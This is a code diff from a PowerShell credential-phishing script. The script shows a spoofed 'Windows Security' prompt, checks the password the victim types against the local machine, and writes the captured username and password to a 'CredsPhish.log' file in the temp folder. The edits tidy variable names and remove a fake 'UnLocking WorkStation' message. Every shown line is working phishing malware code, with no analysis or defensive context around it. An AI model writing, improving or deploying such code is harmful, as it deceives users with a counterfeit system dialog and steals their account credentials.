@@ -39,7 +39,7 @@ while ($counter -lt '1000000000')
   $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $Account, "NetBiosUserName")
+  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $account, "NetBiosUserName")
   $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
@@ -47,10 +47,9 @@ while ($counter -lt '1000000000')
     If(-not($validate) -or $validate -eq $null)
     {
       $logpath = Test-Path -Path "$env:tmp\CredsPhish.log";If($logpath -eq $True){Remove-Item $env:tmp\CredsPhish.log -Force}
-      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
     }else{
       $timestamp = Get-Date;
-      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
       echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
       echo "   ----------------------------" >> $env:tmp\CredsPhish.log
